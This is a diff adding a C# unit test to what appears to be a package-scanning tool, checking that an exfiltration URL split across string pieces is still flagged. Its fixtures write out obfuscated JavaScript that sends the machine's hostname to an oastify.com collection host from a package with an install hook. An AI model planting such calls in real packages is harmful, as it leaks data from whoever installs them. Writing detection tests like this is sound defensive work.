@@ -209,6 +209,15 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Contains(r.Findings, x => x is { Rule: "package/collection-url", Level: "noteworthy", Path: "package/node_modules/other/index.js" });
     }
 
+    [Theory]
+    [InlineData("https.get('https://x1.oast'+'ify.com/?h='+os.hostname());")]
+    [InlineData("https.get(`ht${'tps'}://x1.oast${'ify'}.com/?h=`+os.hostname());")]
+    public void A_collection_url_split_across_string_parts_keeps_its_level(string call)
+    {
+        var r = Review(Tgz("split.tgz", ("package/package.json", Preinstall), ("package/index.js", "const os=require('os'),https=require('https');\n" + call)));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/collection-url", Level: "noteworthy", Path: "package/index.js" });
+    }
+
     [Fact]
     public void A_require_chain_past_the_hop_budget_is_reported_as_partial()
     {
